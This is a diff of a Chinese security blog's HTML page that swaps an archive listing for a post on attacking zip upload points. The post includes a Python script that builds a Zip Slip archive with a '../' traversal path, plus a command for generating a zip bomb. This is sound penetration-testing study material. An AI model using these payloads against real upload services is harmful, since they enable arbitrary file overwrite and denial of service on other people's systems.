@@ -20,17 +20,19 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="记录学习路上的一些东西">
-<meta property="og:type" content="website">
-<meta property="og:title" content="十三の博客">
-<meta property="og:url" content="http://example.com/archives/index.html">
+  <meta name="description" content="关于zip上传点的攻击思路1.目录走访漏洞（Zip Slip）记一次Zip Slip漏洞 - 知乎 (zhihu.com) 1234567import zipfile# the name of the zip file to generatezf &#x3D; zipfile.ZipFile(&amp;#x27;out.zip&amp;#x27;, &amp;#x27;w&amp;#x27;)# the name of the malic">
+<meta property="og:type" content="article">
+<meta property="og:title" content="关于zip上传点的攻击思路.md">
+<meta property="og:url" content="http://example.com/2022/03/13/%E5%85%B3%E4%BA%8Ezip%E4%B8%8A%E4%BC%A0%E7%82%B9%E7%9A%84%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF-md/index.html">
 <meta property="og:site_name" content="十三の博客">
-<meta property="og:description" content="记录学习路上的一些东西">
+<meta property="og:description" content="关于zip上传点的攻击思路1.目录走访漏洞（Zip Slip）记一次Zip Slip漏洞 - 知乎 (zhihu.com) 1234567import zipfile# the name of the zip file to generatezf &#x3D; zipfile.ZipFile(&amp;#x27;out.zip&amp;#x27;, &amp;#x27;w&amp;#x27;)# the name of the malic">
 <meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-03-13T13:55:15.000Z">
+<meta property="article:modified_time" content="2022-03-13T13:55:46.016Z">
 <meta property="article:author" content="十三">
 <meta name="twitter:card" content="summary">
 
-<link rel="canonical" href="http://example.com/archives/">
+<link rel="canonical" href="http://example.com/2022/03/13/%E5%85%B3%E4%BA%8Ezip%E4%B8%8A%E4%BC%A0%E7%82%B9%E7%9A%84%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF-md/">
 
 
 <script id="page-configurations">
@@ -38,12 +40,12 @@
   CONFIG.page = {
     sidebar: "",
     isHome : false,
-    isPost : false,
+    isPost : true,
     lang   : 'zh-cn'
   };
 </script>
 
-  <title>归档 | 十三の博客</title>
+  <title>关于zip上传点的攻击思路.md | 十三の博客</title>
   
 
 
@@ -199,335 +201,102 @@
         <div class="content-wrap">
           
 
-          <div class="content archive">
+          <div class="content post posts-expand">
             
 
+    
   
   
-  
-  <div class="post-block">
-    <div class="posts-collapse">
-      <div class="collection-title">
-        
-        <span class="collection-header">不错! 目前共计 51 篇日志。 继续努力。</span>
-      </div>
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/13/%E5%85%B3%E4%BA%8Ezip%E4%B8%8A%E4%BC%A0%E7%82%B9%E7%9A%84%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF-md/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="十三">
+      <meta itemprop="description" content="记录学习路上的一些东西">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="十三の博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          关于zip上传点的攻击思路.md
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-03-13 21:55:15 / 修改时间：21:55:46" itemprop="dateCreated datePublished" datetime="2022-03-13T21:55:15+08:00">2022-03-13</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/penetration/" itemprop="url" rel="index"><span itemprop="name">-penetration</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-    <div class="collection-year">
-      <span class="collection-header">2022</span>
-    </div>
+        <h1 id="关于zip上传点的攻击思路"><a href="#关于zip上传点的攻击思路" class="headerlink" title="关于zip上传点的攻击思路"></a>关于zip上传点的攻击思路</h1><h1 id="1-目录走访漏洞（Zip-Slip）"><a href="#1-目录走访漏洞（Zip-Slip）" class="headerlink" title="1.目录走访漏洞（Zip Slip）"></a>1.目录走访漏洞（Zip Slip）</h1><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/90905327">记一次Zip Slip漏洞 - 知乎 (zhihu.com)</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="comment"># the name of the zip file to generate</span></span><br><span class="line">zf = zipfile.ZipFile(<span class="string">&#x27;out.zip&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="comment"># the name of the malicious file that will overwrite the origial file (must exist on disk)</span></span><br><span class="line">fname = <span class="string">&#x27;sec_test.txt&#x27;</span></span><br><span class="line"><span class="comment">#destination path of the file</span></span><br><span class="line">zf.write(fname, <span class="string">&#x27;../../../../../../../../../../../../../../../../../../../../../../../../tmp/sec_test.tmp&#x27;</span>)</span><br></pre></td></tr></table></figure>
 
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+<p>Zip Slip是一个广泛存在的漏洞，除了Java语言，JavaScript，Ruby，.NET和Go都有此问题。</p>
+<p>就是上传点zip自解压的时候，把我们zip的文件写入的恶意目录给执行了，导致了任意目录文件上传并且覆盖。</p>
+<h1 id="2-zip炸弹（不建议使用）"><a href="#2-zip炸弹（不建议使用）" class="headerlink" title="2.zip炸弹（不建议使用）"></a>2.zip炸弹（不建议使用）</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lnlvinso/p/11838904.html">zip炸弹 - lnlvinso - 博客园 (cnblogs.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/fenwangduanyan/article/details/112969329">(51条消息) 压缩炸弹(zipbomb)制作（附演示）_fenwangduanyan的博客-CSDN博客</a></p>
+<h2 id="常识"><a href="#常识" class="headerlink" title="常识"></a>常识</h2><p> 42.zip 是很有名的zip炸弹。一个42KB的文件，解压完其实是个4.5PB的“炸弹”。</p>
+<p>​    更有甚者，一个叫做 droste.zip 的大小为 28 KB 的文件，一旦被打开了以后，就会无限解压缩生成一份同样的文件，直到永远。</p>
+<p>​    zip炸弹文件中有大量刻意重复的数据，这种重复数据在压缩的时候是可以被丢弃的，这也就是压缩后的文件其实并不大的原因。</p>
+<p>​    可以看一下 <a target="_blank" rel="noopener" href="https://blog.csdn.net/j2IaYU7Y/article/details/82321082">https://blog.csdn.net/j2IaYU7Y/article/details/82321082</a></p>
+<h2 id="制作"><a href="#制作" class="headerlink" title="制作"></a>制作</h2><p>https://<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=github&spm=1001.2101.3001.7020">github</a>.com/CreeperKong/zipbomb-generator</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 zipbomb.py --mode=quoted_overlap --num-files=250 --compressed-size=21179 &gt; zbsm.zip</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2022-03-13T21:55:15+08:00"
-              content="2022-03-13">
-          03-13
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/2022/03/13/%E5%85%B3%E4%BA%8Ezip%E4%B8%8A%E4%BC%A0%E7%82%B9%E7%9A%84%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF-md/" itemprop="url">
-            <span itemprop="name">关于zip上传点的攻击思路.md</span>
-          </a>
-      </div>
-
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2022-03-06T19:17:38+08:00"
-              content="2022-03-06">
-          03-06
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/2022/03/06/%E8%87%AA%E5%8A%A8%E6%9F%A5%E8%AF%A2icp%E8%84%9A%E6%9C%AC/" itemprop="url">
-            <span itemprop="name">自动查询icp脚本</span>
-          </a>
-      </div>
-
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2022-03-04T20:12:39+08:00"
-              content="2022-03-04">
-          03-04
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/2022/03/04/JWT%E6%8A%80%E6%9C%AF%E2%80%94%E2%80%94%E5%9F%BA%E4%BA%8Etoken%E7%9A%84%E9%89%B4%E6%9D%83%E6%9C%BA%E5%88%B6/" itemprop="url">
-            <span itemprop="name">JWT技术——基于token的鉴权机制</span>
-          </a>
-      </div>
-
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2022-03-04T17:11:24+08:00"
-              content="2022-03-04">
-          03-04
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/2022/03/04/gifxss/" itemprop="url">
-            <span itemprop="name">gifxss</span>
-          </a>
-      </div>
-
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2022-02-21T21:29:35+08:00"
-              content="2022-02-21">
-          02-21
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/2022/02/21/%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80%EF%BC%88html-css)/" itemprop="url">
-            <span itemprop="name">前端基础（html css ）</span>
-          </a>
-      </div>
-
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2022-02-19T11:01:51+08:00"
-              content="2022-02-19">
-          02-19
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/2022/02/19/%E4%B8%80%E3%80%81%E8%BF%9B%E9%98%B6py%EF%BC%9A%E9%80%9A%E5%85%B3%E4%B8%80%E4%B8%AA%E6%9F%90%E6%A0%A1%E7%9A%84%E9%A2%98%E5%BA%93/" itemprop="url">
-            <span itemprop="name">一、进阶py：通关一个某校的题库</span>
-          </a>
-      </div>
-
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2022-02-17T17:14:36+08:00"
-              content="2022-02-17">
-          02-17
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/2022/02/17/%E4%BB%8A%E6%97%A5%E6%B8%97%E9%80%8F%E7%9A%84%E7%9F%A5%E8%AF%86%EF%BC%88%E5%BF%83%E8%B7%B3%E5%8C%85-%E8%AE%BF%E9%97%AE%E4%B8%8D%E4%BA%86%E7%9A%84%E5%9F%9F%E5%90%8D%EF%BC%89/" itemprop="url">
-            <span itemprop="name">今日渗透的知识（心跳包 访问不了的域名）</span>
-          </a>
-      </div>
-
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2022-02-10T11:42:17+08:00"
-              content="2022-02-10">
-          02-10
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/2022/02/10/WEB%E5%85%A5%E9%97%A8/" itemprop="url">
-            <span itemprop="name">WEB入门</span>
-          </a>
-      </div>
-
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2022-02-08T16:29:32+08:00"
-              content="2022-02-08">
-          02-08
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/2022/02/08/xray-rad-%E8%87%AA%E5%8A%A8%E5%8C%96edusrc/" itemprop="url">
-            <span itemprop="name">xray+rad 自动化edusrc</span>
-          </a>
-      </div>
-
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2022-02-03T23:57:42+08:00"
-              content="2022-02-03">
-          02-03
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/2022/02/03/%E7%9F%AD%E4%BF%A1%E9%AA%8C%E8%AF%81%E7%A0%81%E6%8E%A5%E5%8F%A3%E9%99%90%E5%88%B6/" itemprop="url">
-            <span itemprop="name">短信验证码接口限制</span>
-          </a>
-      </div>
-
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2022-02-01T22:38:14+08:00"
-              content="2022-02-01">
-          02-01
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/2022/02/01/pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/" itemprop="url">
-            <span itemprop="name">pikachu靶场通关</span>
-          </a>
-      </div>
-
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2022-01-30T11:50:48+08:00"
-              content="2022-01-30">
-          01-30
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/2022/01/30/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" itemprop="url">
-            <span itemprop="name">信息收集</span>
-          </a>
-      </div>
-
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2022-01-28T15:33:47+08:00"
-              content="2022-01-28">
-          01-28
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/2022/01/28/%E8%B0%B7%E6%AD%8C%E8%AF%AD%E6%B3%95/" itemprop="url">
-            <span itemprop="name">谷歌语法</span>
-          </a>
-      </div>
-
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2022-01-27T18:04:33+08:00"
-              content="2022-01-27">
-          01-27
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/2022/01/27/py%E7%88%AC%E8%99%AB-%E5%85%A5%E9%97%A8%EF%BC%88b%E7%AB%99%E8%AF%BE%E7%A8%8B%EF%BC%89/" itemprop="url">
-            <span itemprop="name">py爬虫-入门（b站课程）</span>
-          </a>
-      </div>
-
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2022-01-21T17:23:05+08:00"
-              content="2022-01-21">
-          01-21
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/2022/01/21/knight-ctf-web-wp/" itemprop="url">
-            <span itemprop="name">knight ctf web wp</span>
-          </a>
-      </div>
-
-    </header>
-  </article>
-
+<p>–num-files ：压缩包包含的文件数量</p>
+<p>–compressed-size：文件压缩大小</p>
 
     </div>
-  </div>
-  
-  
-  
 
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/03/06/%E8%87%AA%E5%8A%A8%E6%9F%A5%E8%AF%A2icp%E8%84%9A%E6%9C%AC/" rel="prev" title="自动查询icp脚本">
+      <i class="fa fa-chevron-left"></i> 自动查询icp脚本
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
   
-  <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/archives/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/archives/page/4/">4</a><a class="extend next" rel="next" href="/archives/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
-  </nav>
+  
+  
 
 
 
@@ -579,6 +348,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%85%B3%E4%BA%8Ezip%E4%B8%8A%E4%BC%A0%E7%82%B9%E7%9A%84%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF"><span class="nav-number">1.</span> <span class="nav-text">关于zip上传点的攻击思路</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#1-%E7%9B%AE%E5%BD%95%E8%B5%B0%E8%AE%BF%E6%BC%8F%E6%B4%9E%EF%BC%88Zip-Slip%EF%BC%89"><span class="nav-number">2.</span> <span class="nav-text">1.目录走访漏洞（Zip Slip）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-zip%E7%82%B8%E5%BC%B9%EF%BC%88%E4%B8%8D%E5%BB%BA%E8%AE%AE%E4%BD%BF%E7%94%A8%EF%BC%89"><span class="nav-number">3.</span> <span class="nav-text">2.zip炸弹（不建议使用）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%B8%E8%AF%86"><span class="nav-number">3.1.</span> <span class="nav-text">常识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%B6%E4%BD%9C"><span class="nav-number">3.2.</span> <span class="nav-text">制作</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
